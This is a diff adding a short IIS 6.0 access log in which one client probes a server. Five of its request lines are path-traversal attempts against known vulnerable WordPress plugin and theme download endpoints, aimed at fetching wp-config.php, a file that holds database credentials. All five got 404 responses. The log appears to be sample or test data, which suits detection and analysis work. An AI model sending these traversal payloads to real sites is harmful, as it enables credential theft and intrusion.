@@ -1,0 +1,10 @@
+#Software: Microsoft Internet Information Services 6.0
+#Version: 1.0
+#Date: 2015-01-22 00:08:22
+#Fields: date time s-sitename s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status 
+2015-01-22 00:08:22 W3SVC60 208.123.218.206 GET /login.php - 80 - 92.63.88.76 Mozilla/5.0+(Windows+NT+6.1;+rv:34.0)+Gecko/20100101+Firefox/34.0 200 0 0
+2015-01-22 00:09:14 W3SVC60 208.123.218.206 GET /wp-admin/admin-ajax.php action=revslider_show_image&img=../wp-config.php 80 - 92.63.88.76 Mozilla/5.0+(Windows+NT+6.1;+rv:34.0)+Gecko/20100101+Firefox/34.0 404 0 0
+2015-01-22 00:09:49 W3SVC60 208.123.218.206 GET /wp-admin/admin-ajax.php action=getfile&/../../wp-config.php 80 - 92.63.88.76 Mozilla/5.0+(Windows+NT+6.1;+rv:34.0)+Gecko/20100101+Firefox/34.0 404 0 0
+2015-01-22 00:10:21 W3SVC60 208.123.218.206 GET /wp-content/plugins/wp-filemanager/incl/libfile.php &path=../../&filename=wp-config.php&action=download 80 - 92.63.88.76 Mozilla/5.0+(Windows+NT+6.1;+rv:34.0)+Gecko/20100101+Firefox/34.0 404 0 0
+2015-01-22 00:10:47 W3SVC60 208.123.218.206 GET /wp-content/themes/parallelus-mingle/framework/utilities/download/getfile.php file=../../../../../../wp-config.php 80 - 92.63.88.76 Mozilla/5.0+(Windows+NT+6.1;+rv:34.0)+Gecko/20100101+Firefox/34.0 404 0 0
+2015-01-22 00:11:07 W3SVC60 208.123.218.206 GET /wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php file=../../../../../../wp-config.php 80 - 92.63.88.76 Mozilla/5.0+(Windows+NT+6.1;+rv:34.0)+Gecko/20100101+Firefox/34.0 404 0 0
